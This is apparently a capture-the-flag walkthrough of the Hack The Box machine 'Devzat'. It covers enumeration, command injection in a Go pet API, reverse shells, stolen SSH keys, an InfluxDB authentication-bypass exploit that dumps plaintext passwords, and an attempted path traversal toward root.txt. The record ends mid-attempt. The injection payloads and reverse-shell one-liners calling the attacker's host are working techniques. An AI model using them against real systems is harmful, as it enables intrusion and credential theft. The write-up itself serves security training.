# Introduction
So this is a fun box, definetly my favorite. It has all the elements you need, rabbitholes, enumeration, exploits, creative thinking. Actually a more beginner friendly box than one might think. The real challenge is being creative.
# Enumeration
So lets start off with a nmap scan. If you don't know what the -sC, -sV and -oA flags are that is standard scripts, version detection and save the output to all formats.

```bash
──(kali㉿kali)-[~/Documents/HTB/Devzat]
└─$ nmap -sC -sV 10.10.11.118 -oA nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 05:13 EST 
Nmap scan report for 10.10.11.118
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://devzat.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=2/27%Time=621B4EE4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.53 seconds
```
Ok cool a ssh port on 8000, havn't see that before. Lets check that out.
```bash
──(kali㉿kali)-[~/Documents/HTB/Devzat]
└─$ ssh 10.10.11.118 -p 8000
Unable to negotiate with 10.10.11.118 port 8000: no matching host key type found. Their offer: ssh-rsa 

#Ok so it doesn't like standard connections, lets doo what it says and use the ssh-rsa key method

┌──(kali㉿kali)-[~/Documents/HTB/Devzat]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa 10.10.11.118 -p 8000
The authenticity of host '[10.10.11.118]:8000 ([10.10.11.118]:8000)' can't be established.                           
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.                                           
This key is not known by any other names                                                                             
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                             
Warning: Permanently added '[10.10.11.118]:8000' (RSA) to the list of known hosts.
17 hours 12 minutes earlier
devbot: test has left the chatdevbot: 
test stayed on for 31 minutes 
16 hours 12 minutes earlier
devbot: rroot has joined the chat
16 hours 2 minutes earlier
devbot: rroot has left the chat                                                                                      
devbot: rroot stayed on for 11 minutes
18 minutes earlier
devbot: You seem to be new here darko. Welcome to Devzat! Run /help to see what you can do.                          
devbot: darko has joined the chat                                                                                    
darko: whoami                                                                                                        
darko: *id
darko: id 
darko: commands
darko: emojis
darko: shrug                                                                                                         
darko: ¯(ツ)/¯ 
15 minutes earlier
devbot: darko has left the chat                                                                                      
devbot: darko stayed on for 4 minutes                                                                                
Welcome to the chat. There are no more users                                                                         
devbot: kali has joined the chat 

#Ok cool an IRC chat, some quick google searching doesn't show any vulns as of now. But lets enumerate a bit more

kali: /help                                                                                                          
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat                                     
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.                      
[SYSTEM]                                                                                                             
[SYSTEM] Interesting features:                                                                                       
[SYSTEM] • Many, many commands. Run /commands.                                                                       
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.                                  
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.                 
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.          
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.                 
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.                                            
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.                            
[SYSTEM] • Emoji replacements! (like on Slack and Discord)                                                           
[SYSTEM]                                                                                                             
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. 
[SYSTEM]                                                                                                             
[SYSTEM] Made by Ishan Goel with feature ideas from friends.                                                         
[SYSTEM] Thanks to Caleb Denio for lending his server!                                                               
[SYSTEM]                                                                                                             
[SYSTEM] For a list of commands run                                                                                  
[SYSTEM] ┃ /commands  
kali: /room
[SYSTEM] You are currently in #main
[SYSTEM] Rooms and users
[SYSTEM] #main: [kali]
kali: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
kali: /whoami
[SYSTEM] This is not that kind of shell
kali: /nick; pwd
[SYSTEM] This is not that kind of shell
```
Well that seems like a dead end. So lets move on.
# Dirb
Ok, so this is where I must admit that I am slowly moving away from dirb. Dirb is great but I'm lacking the functionality to enumerate subdomains. As you see under, I'm only able to enumerate the contents of this page. So gobuster is slowly becoming my new goto. In addition, I have a bad habit of using the common wordlist, this doesn't always get the right results. Therefore I reccommend getting the seclist repo. This is much bigger.https://github.com/danielmiessler/SecLists
```bash
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ dirb http://devzat.htb
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sun Mar  6 07:30:03 2022
URL_BASE: http://devzat.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612                       

---- Scanning URL: http://devzat.htb/ ----
==> DIRECTORY: http://devzat.htb/assets/
==> DIRECTORY: http://devzat.htb/images/
+ http://devzat.htb/index.html (CODE:200|SIZE:6527)
==> DIRECTORY: http://devzat.htb/javascript/
+ http://devzat.htb/server-status (CODE:403|SIZE:275)
---- Entering directory: http://devzat.htb/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://devzat.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://devzat.htb/javascript/ ----
^C> Testing: http://devzat.htb/javascript/stow                 
```
This didn't get any results, I ran gobuster simutainiously and it got a hit before it was done. So therefore it was terminated while looking in the javascript dir.

I will briefly explain the flags here,
- vhost = virtual host enumeration, finding subdomains
- -u is host
- -w is wordlist file
- -r is follow redirects
- -t is threads

If I run gobuster without the -r, it doesn't follow redirects and gets a bunch of 302, this reports everything as false positives.
The -t is to speed things up.
```bash
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ gobuster vhost -u http://devzat.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r -t 80 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devzat.htb
[+] Method:       GET
[+] Threads:      80
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/06 08:04:49 Starting gobuster in VHOST enumeration mode
===============================================================
Found: pets.devzat.htb (Status: 200) [Size: 510]
                                                
===============================================================
2022/03/06 08:09:49 Finished
===============================================================
```
Perfect, we found one! Lets quickly add that to `/etc/hosts` and enumerate further!
# Enumeration part 2
![pets](https://i.imgur.com/IvbpUIq.png)
So I started a nmap scan in the background to try to find anything useful. It found a .git repository! So using a simple tool, we can extract this and try to find the sourcecode for the page!
```bash
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ nmap -sC -sV pets.devzat.htb                                                                                                                                                                                1 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 08:16 EST
Nmap scan report for pets.devzat.htb (10.10.11.118)
Host is up (0.097s latency).
rDNS record for 10.10.11.118: devzat.htb
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Pet Inventory
| http-git: 
|   10.10.11.118:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: back again to localhost only 
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  My genious go pet server
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/6%Time=6224B444%P=x86_64-pc-linux-gnu%r(NUL
SF:L,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.93 seconds
```
The tool i tried was [GitTools](https://github.com/internetwache/GitTools). It had the posibility to dump the .git contents of a page. Here is the page for you to check out, but basicly you run it and it clones everything into a .git folder of your choosing. 
[Here](https://blog.pentesteracademy.com/mining-exposed-git-directory-in-3-simple-steps-b6cfaf80b89b) is a neat howto if you need help:
```bash
┌──(kali㉿kali)-[/opt/GitTools/Dumper]
└─$ ./gitdumper.sh http://pets.devzat.htb/.git/ /home/kali/Documents/htb/devzat

┌──(kali㉿kali)-[~/Documents/htb/devzat/.git]
└─$ git show 8274d7a547c0c3854c074579dfc359664082a8f6  
--------------
+       Pets []Pet = []Pet{
+               {Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
+               {Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
+               {Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
+               {Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
+               {Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
+               {Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
+               {Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
+               {Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
+       }
+)
+
+func loadCharacter(species string) string {
+       cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
+       stdoutStderr, err := cmd.CombinedOutput()
+       if err != nil {
+               return err.Error()
+       }
+       return string(stdoutStderr)
+}
+
+func getPets(w http.ResponseWriter, r *http.Request) {
+       json.NewEncoder(w).Encode(Pets)
+}
+
+func addPet(w http.ResponseWriter, r *http.Request) {

```
Ok great, lets explain whats happening here. The page is intended to show the database of animals and print whatever you add. BUT, it has the vulnerable code in the characteristics field. Becuase it odes the following: `cmd := exec.Command("sh", "-c", "cat characteristics/"+species)`. A modified version of this could be `cmd := exec.Command("sh", "-c", "cat dog; pwd;/"+species)` This would just simply print the characteristics of the dog file, then print the working directory and then not know what to do with the +species at the end.
So my burprepeater request looks like this
```html
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 16
Connection: close
{"name":"hello",
"species":"bluewhale; pwd"
}
```
And the respons would simply output:
```bash
{"name":"hello","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant./home/patrick/pets"}]

```
![cat](https://i.imgur.com/sJPxw2D.png)
We have code execution!

# Inital foothold
Ok so by using pentestmonkeys reverseshell cheatsheet we try to achive a reverse shell. For some reason a normal reverse sell doesn't work.
```json
// Query
{"name":"hello","species":"gopher; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 7070 >/tmp/f"}
// Reply
{"name":"hello","species":"gopher; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.10.10 7070 \u003e/tmp/f","characteristics":"exit status 127"}]

```
So lets simply base 64 encode it and try it again.
```bash
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ echo "bash -i >& /dev/tcp/10.10.10.10/7070 0>&1" | base64                                                                                                                                     
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC83MDcwIDA+JjEK
                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC83MDcwIDA+JjEK" | base64 -d
bash -i >& /dev/tcp/10.10.10.10/7070 0>&1
```
Now sending the encoded reverse shell
```bash
# Request
{"name":"hello","species":"gopher; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC83MDcwIDA+JjEK" | base64 -d | bash"}

# ---- Listener
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ nc -nvlp 7070
listening on [any] 7070 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.11.118] 40274
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$
```
We got shell!
# Enumeration
So our shell is bad, we need to upgrade that, `python -c 'import pty; pty.spawn("/bin/bash")'` didn't seem to work, so lets find another way. We can read the .ssh/id_rsa. This means that we can start logging in to the machine via a private key. Simple, we will just copy the contents and put that in our own .ssh folder as id_rsa_patrick. Don't be an idiot like me and use `chmod +600`, becuase that adds privileges, instead you need `chmod 600` becuase that sets it to 600.
```bash
patrick@devzat:~$ ls /home/patrick/.ssh/
authorized_keys  id_rsa  known_hosts

-------


┌──(kali㉿kali)-[~/.ssh]
└─$ vim id_rsa_patrick
┌──(kali㉿kali)-[~/.ssh]    
└─$ chmod +600 id_rsa_patrick                                                                                                                                                                                     

┌──(kali㉿kali)-[~/.ssh] 
└─$ ssh -i id_rsa_patrick patrick@10.10.11.118
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa_patrick' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa_patrick": bad permissions
patrick@10.10.11.118: Permission denied (publickey).

┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 id_rsa_patrick 
                          
┌──(kali㉿kali)-[~/.ssh] 
└─$ ssh -i id_rsa_patrick patrick@10.10.11.118
Last login: Mon Mar  7 01:01:21 2022 from 10.10.14.39
patrick@devzat:~$ 

```

Perfect, so lets grab the userflag... But it isn't in /home/patrick/. It's in `/home/catherine`. And we dont have access... I guess lets enumerate.
So we have a couple of folders in patricks home file: pets, devzat.
Lets just do a quick search be doing a recursive grep `grep -R catherine`, this might yield some information about catherine. Immedietly we get a chatlog metween her and patrick. So by doing a cat on that file we get this
```python
if strings.ToLower(u.name) == "patrick" {  
                u.writeln("admin", "Hey patrick, you there?") 
                u.writeln("patrick", "Sure, shoot boss!") 
                u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")   
                u.writeln("patrick", "Cool :thumbs_up:")  
                u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?")   
                u.writeln("patrick", "Yes, sure. Am on it!")    
                u.writeln("devbot", "admin has left the chat")         
        } else if strings.ToLower(u.name) == "admin" {  
                u.writeln("admin", "Hey patrick, you there?")   
                u.writeln("patrick", "Sure, shoot boss!") 
                u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")    
                u.writeln("patrick", "Cool :thumbs_up:")  
                u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?") 
                u.writeln("patrick", "Yes, sure. Am on it!")  
        } else if strings.ToLower(u.name) == "catherine" {  
                u.writeln("patrick", "Hey Catherine, glad you came.")    
                u.writeln("catherine", "Hey bud, what are you up to?")  
                u.writeln("patrick", "Remember the cool new feature we talked about the other day?")     
                u.writeln("catherine", "Sure")  
                u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")  
                u.writeln("catherine", "Kinda busy right now :necktie:")  
                u.writeln("patrick", "That's perfectly fine :thumbs_up: You'll need a password I gave you last time.")
                u.writeln("catherine", "k")  
                u.writeln("patrick", "I left the source for your review in backups.") 
                u.writeln("catherine", "Fine. As soon as the boss let me off the leash I will check it out.") 
                u.writeln("patrick", "Cool. I am very curious what you think of it. See ya!") 
                u.writeln("devbot", "patrick has left the chat") 
        } else {  
                if len(backlog) > 0 { 
                        lastStamp := backlog[0].timestamp    
                        u.rWriteln(printPrettyDuration(u.joinTime.Sub(lastStamp)) + " earlier")   
                        for i := range backlog { 
                                if backlog[i].timestamp.Sub(lastStamp) > time.Minute {     
                                        lastStamp = backlog[i].timestamp
                                        u.rWriteln(printPrettyDuration(u.joinTime.Sub(lastStamp)) + " earlier")  
                                }   
                                u.writeln(backlog[i].senderName, backlog[i].text)
```
So we have a nice vector here. We have a chatlog mentioning a new instance (probably a chat) for devs at port 8443 AND they are talking about a password in the backups folder. They even gave us a quick way to find the password using `diff`. So lets check out those backups!
```bash
patrick@devzat:/var/backups$ ls -la
total 1128
drwxr-xr-x  2 root      root        4096 Mar  7 06:25 .
drwxr-xr-x 14 root      root        4096 Jun 22  2021 ..
-rw-r--r--  1 root      root       51200 Mar  7 06:25 alternatives.tar.0
-rw-r--r--  1 root      root       59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root        6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root        6602 Jul 16  2021 apt.extended_states.2.gz
-rw-------  1 catherine catherine  28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine  27567 Jul 16  2021 devzat-main.zip
-rw-r--r--  1 root      root         268 Sep 29 11:46 dpkg.diversions.0
-rw-r--r--  1 root      root         170 Jul 16  2021 dpkg.statoverride.0
-rw-r--r--  1 root      root      949034 Jan 26 14:52 dpkg.status.0
patrick@devzat:/var/backups$
```
We don't have the privileges to view these files now, so lets get back to that.
Lets check out that chat
```bash
patrick@devzat:/var/backups$ ss -ntlp
State                 Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port                Process
LISTEN                0                     4096                                     127.0.0.1:5000                                    0.0.0.0:*                    users:(("petshop",pid=851,fd=3))                
LISTEN                0                     4096                                 127.0.0.53%lo:53                                      0.0.0.0:* 
LISTEN                0                     4096                                     127.0.0.1:8086                                    0.0.0.0:*
LISTEN                0                     128                                        0.0.0.0:22                                      0.0.0.0:* 
LISTEN                0                     4096                                     127.0.0.1:8443                                    0.0.0.0:* 
LISTEN                0                     511                                              *:80                                            *:*  
LISTEN                0                     128                                           [::]:22                                         [::]:* 
LISTEN                0                     4096                                             *:8000                                          *:*                    users:(("devchat",pid=852,fd=7))
```
Ok it's running, lets see what it is, also there is another service at port 8086... wierd, lets check that out later.
```
patrick@devzat:/var/backups$ ssh catherine@127.0.0.1 -p 8443 
The authenticity of host '[127.0.0.1]:8443 ([127.0.0.1]:8443)' can't be established.
ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '[127.0.0.1]:8443' (ED25519) to the list of known hosts.
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to? 
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure       
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.   
catherine: Kinda busy right now 👔 
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location. 
catherine: k          
patrick: I also put the main so you could diff main dev if you want. 
catherine: Fine. As soon as the boss let me off the leash I will check it out. 
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be   secure yet. See ya!
devbot: patrick has left the chat
catherine: /commands 
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal 
[SYSTEM] message - Sends a private message to someone 
[SYSTEM] users - Gets a list of the active users     
[SYSTEM] all - Gets a list of all users who has ever connected 
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged  
[SYSTEM] bell - Toggles notifications when you get pinged               
[SYSTEM] room - Changes which room you are currently in   
[SYSTEM] id - Gets the hashed IP of the user                         
[SYSTEM] commands - Get a list of commands           
[SYSTEM] nick - Change your display name 
[SYSTEM] color - Change your display name color   
[SYSTEM] timezone - Change how you view time  
[SYSTEM] emojis - Get a list of emojis you can use  
[SYSTEM] help - Get generic info about the server   
[SYSTEM] tictactoe - Play tictactoe 
[SYSTEM] hangman - Play hangman      
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]
```
So the new function is pasting files contents! He also said it wasn't verry secure, I'm guessing it's running with root privileges or possibly a setuid. Anyway, lets try to use it!

```bash
catherine: /file /root/root.txt
[SYSTEM] You did provide the wrong password
```
Well that would of have been too easy. So we could bruteforce the password, or try to sql inject it or something, but there is an easier way. It's in the backup file. So lets get ahold of catherine. For that, lets start enumerating the other unknown service
## Port forwarding
Portforwarding is a basic feature that we need to master. It allows us to pivot further into a network and access things we wern't allowed to. Like the internal service that is at port 8086. The easiest way is to use ssh for this. It has a easy syntax and offers the best alternative available now. We still don't know patricks password, but we have his private key. So it would look something like this
```
patrick@devzat:/var/backups$ ss -ntlp
State                 Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port                Process
LISTEN                0                     4096                                     127.0.0.1:5000                                    0.0.0.0:*                    users:(("petshop",pid=851,fd=3))                
LISTEN                0                     4096                                 127.0.0.53%lo:53                                      0.0.0.0:* 
LISTEN                0                     4096                                     127.0.0.1:8086                                    0.0.0.0:*
LISTEN                0                     128                                        0.0.0.0:22                                      0.0.0.0:* 
LISTEN                0                     4096                                     127.0.0.1:8443                                    0.0.0.0:* 
LISTEN                0                     511                                              *:80                                            *:*  
LISTEN                0                     128                                           [::]:22                                         [::]:* 
LISTEN                0                     4096                                             *:8000                                          *:*                    users:(("devchat",pid=852,fd=7))                
patrick@devzat:~$ ls /home/patrick/.ssh/
authorized_keys  id_rsa  known_hosts
patrick@devzat:~$ ssh -N -L 0.0.0.0:6969:127.0.0.1:8086 -i /home/patrick/.ssh/id_rsa patrick@10.10.11.118
The authenticity of host '10.10.11.118 (10.10.11.118)' can't be established.
ECDSA key fingerprint is SHA256:0rsaIiCqLD9ELa+kVyYB1zoufcsvYtVR7QKaYzUyC0Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.118' (ECDSA) to the list of known hosts.

──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ nmap -sC -sV 10.10.11.118 -p 6969 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 14:52 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.096s latency).

PORT     STATE SERVICE VERSION
6969/tcp open  http    InfluxDB http admin 1.7.5
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```
Perfect our port forwarding is working and we have a webservice running at that new port. What is it and how can we breat it?
![influx](https://i.imgur.com/Sb4y3Hn.png)
```bash
┌──(kali㉿kali)-[~/Documents/htb/devzat]
└─$ searchsploit influx
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

So nothing at exploit-db, but github seems to have some answers. https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

It seems like a unauthenticated user can gain access through a forged JWT cookie. Perfect, lets just grab that and fire it up
## Exploit
To be honest, it's just sql, and the exploit is verry self explanitory. So lets just run it and get the data
```sql
┌──(kali㉿kali)-[~/Documents/htb/devzat/InfluxDB-Exploit-CVE-2019-20933] 
└─$ python ./__main__.py
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) | 
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_  
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_  
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__| 
                                                         | |
                                                         |_|     
 - using CVE-2019-20933 
Host (default: localhost): 10.10.11.118 
Port (default: 8086): 6969
Username <OR> path to username file (default: users.txt):
Bruteforcing usernames ... 
[v] admin 
Host vulnerable !!!
https://docs.influxdata.com/influxdb/v1.7/introduction/getting-started/
Databases:
1) devzat         
2) _internal
.quit to exit
[admin@10.10.11.118] Database: 1
Starting InfluxDB shell - .back to go back
[admin@10.10.11.118/devzat] $ show measurements       
{ 
    "results": [ 
        {          
            "series": [   
                {            
                    "columns": [   
                        "name"     
                    ], 
                    "name": "measurements",    
                    "values": [ 
                        [ 
                            "user"  
                        ]  
                    ]  
                }  
            ],
            "statement_id": 0 
        }  
    ]
}
[admin@10.10.11.118/devzat] $ select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```
With three users we have catherine and her password!
# Catherine
For some reason I couldn't ssh in to her account, so lets just use su.
```bash
patrick@devzat:~$ su catherine
Password: 
catherine@devzat:/home/patrick$ whoami
catherine
catherine@devzat:/home/patrick$ 
catherine@devzat:/home/patrick$ cd /home/catherine/
catherine@devzat:/home/catherine$ls
user.txt
catherine@devzat:/home/catherine$
```
Perfect, now you can grab the userflag.
# Root-ish
So here is the funny part, we know the password we need is in the backup files, so lets just get them and check it out. Maybe that is enough to get root.
```
catherine@devzat:/dev/shm$ cp /var/backup/devzat-dev* .
catherine@devzat:/dev/shm$ cp /var/backup/devzat-main* .
catherine@devzat:/dev/shm$ unzip devzat-dev*
catherine@devzat:/dev/shm$ unzip devzat-main*
catherine@devzat:/dev/shm$ diff dev main
diff dev/allusers.json main/allusers.json 
1c1,3                        
< {}                        
---                         
> {                       
>    "eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3": "\u001b[38;5;214mtest\u001b[39m" 
> } 
diff dev/commands.go main/commands.go 
4d3
<       "bufio"
<       // Check my secure password
<       if pass != "CeilingCatStillAThingIn2021?" {
<               u.system("You did provide the wrong password")
<               return
<       }
```
Awesome, now lets test it out
```
catherine@devzat:~$ ssh patrick@127.0.0.1 -p 8443
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick: file /root/root.txt CeilingCatStillAThingIn2021?
patrick: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
patrick: /file /root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root.txt does not exist!
patrick: /file /../root.txt CeilingCatStillAThingIn2021?
